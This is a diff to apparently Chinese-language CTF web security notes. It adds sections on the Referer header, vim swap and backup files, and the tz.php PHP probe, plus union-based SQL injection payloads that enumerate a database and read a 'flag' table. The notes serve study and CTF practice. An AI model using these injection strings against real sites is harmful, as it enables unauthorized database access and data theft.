@@ -1,5 +1,9 @@
 # Web Notes
 
+[TOC]
+
+
+
 ### robots.txt
 
 **robots.txt**是一种存放于**网站根目录下**的ASCII编码的文本文件，它通常告诉网络搜索引擎的漫游器（又称**爬虫**），此网站中的哪些内容是**不应被搜索引擎的漫游器获取的**，哪些是**可以被漫游器获取**的。
@@ -86,6 +90,17 @@ var_dump(md5($array1)==var_dump($array2));  //true
 ```
 
 PHP手册中的md5()函数的描述是`string md5 ( string $str [, bool $raw_output = false ] )`，md5()中的需要是一个string类型的参数。但是当你传递一个array时，md5()不会报错，只是会无法正确地求出array的md5值，并且返回`NULL`。这样就会导致任意2个array的md5值都会相等。
+
+
+
+### Referer请求头
+
+`Referer` 请求头包含了当前请求页面的来源页面的地址，即表示当前页面是通过此来源页面里的链接进入的。服务端一般使用 `Referer` 请求头识别访问来源，可能会以此进行统计分析、日志记录以及缓存优化等。
+
+在以下两种情况下，`Referer` 不会被发送：
+
+- 来源页面采用的协议为表示本地文件的 "file" 或者 "data" URI；
+- 当前请求页面采用的是非安全协议，而来源页面采用的是安全协议（HTTPS）。
 
 ### X-Forwarded-For
 
@@ -420,7 +435,26 @@ DROP sampletable;#
 ?id=-1' uniunionon selecselectt 1,group_concat(table_name),3 from infoorrmation_schema.tables where table_schema='web18'--+
 ?id=-1' uniunionon selecselectt 1,group_concat(column_name),3 from infoorrmation_schema.columns where table_name='flag'--+
 ?id=-1' uniunionon selecselectt 1,flag,3 from flag--+
+
+
+?id=-1' union select 1,group_concat(schema_name),3 from information_schema.schemata--+
+?id=-1' union select 1,group_concat(table_name),3 from information_schema.tables where table_schema='web18'--+
+?id=-1' union select 1,group_concat(column_name),3 from information_schema.columns where table_name='flag'--+
+?id=-1' union select 1,flag,3 from flag--+
 ~~~
 
+### vim备份文件
 
+**临时文件 file.swp**
 
+非正常关闭vim编辑器（直接关闭终端、电脑断电等），都会生成一个用于备份缓冲区内容的**临时文件**——`.swp`文件。它记录了用户在非正常关闭vim编辑器之前未能及时保存的修改，用于文件恢复。并且**多次意外退出并不会覆盖旧的.swp文件**，而是会生成一个新的，例如.swo文件。
+
+**备份文件file~**
+
+默认情况下，**备份文件**的名称是在原始文件名最后加上“~”后缀。例如，正在编辑一个名为“data.txt”的文件，那么Vim将产生名为“data.txt~”的备份文件。
+
+### php探针
+
+php探针是用来探测空间、服务器运行状况和PHP信息用的，探针可以实时查看服务器硬盘资源、内存占用、网卡流量、系统负载、服务器时间等信息。
+
+一个比较常见的探针是**雅黑PHP探针**，默认地址是**tz.php**。
